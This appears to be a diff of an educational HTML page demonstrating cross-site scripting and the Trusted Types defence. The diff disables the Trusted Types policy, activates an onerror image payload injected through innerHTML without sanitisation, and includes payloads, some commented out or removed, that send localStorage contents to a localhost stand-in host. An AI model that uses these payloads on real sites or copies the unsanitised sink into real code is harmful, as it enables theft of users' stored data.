@@ -4,8 +4,11 @@
 <head>
   <!-- Enabling Trusted Types -->
 
+  <!--
   <meta http-equiv="Content-Security-Policy" content="require-trusted-types-for 'script'">
-  
+  -->
+
+  <!--
   <script>
     if (window.trustedTypes && trustedTypes.createPolicy) { // Feature testing
         trustedTypes.createPolicy('default', {
@@ -13,6 +16,7 @@
         });
       }
   </script>
+  -->
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.2.7/purify.min.js"
     integrity="sha512-srKA/HGYuusMcB2uqsvHKmqqE39vHU74WIuPBaKS5+wtfI6NquGXQtby+eM7o139a7Gt3szcHS09wou8GK4IJQ=="
@@ -35,13 +39,9 @@
   <img id="myImage">
 
   <script>
-    //const initialData = `Hello <img src="invalid.png" onerror="alert('Put your own malicious code just here!!!')">`;
-    //const initialData = `Hello <img src="invalid.png" onerror="stealStorage()">`;
-    //const initialData = `Hello <img src="document.getElementById('myImage').src = 'http://localhost:8080/attack?values=' + btoa(JSON.stringify(localStorage));`;
+    const initialData = `Hello <img src="invalid.png" onerror="alert('Put your own malicious code just here!!!')">`;
 
-    const initialData = `<img src="invalid.jpg" onerror="var img = document.createElement('img'); img.src = 'http:localhost:8080/attack?value=' + btoa(JSON.stringify(localStorage)); document.querySelector('body').appendChild(img);">`;
-
-
+    //const initialData = `<img src="invalid.jpg" onerror="var img = document.createElement('img'); img.src = 'http:localhost:8080/attack?value=' + btoa(JSON.stringify(localStorage)); document.querySelector('body').appendChild(img);">`;
 
       document.addEventListener("DOMContentLoaded", () => {
         document.getElementById("taData").value = initialData;
@@ -57,17 +57,6 @@
         div.innerHTML = data;
         //div.innerHTML = DOMPurify.sanitize(data);
       }
-  </script>
-  <script>
-    function stealStorage() {
-      let i=0, len=localStorage.length;
-      for (; i < len; ++i) {
-        let img = document.createElement("IMG");
-        img.src = "http://localhost:8080/data?key=" 
-            + localStorage.key(i) + "&value=" 
-            + localStorage.getItem(localStorage.key(i));
-      }
-    }
   </script>
 </body>
 
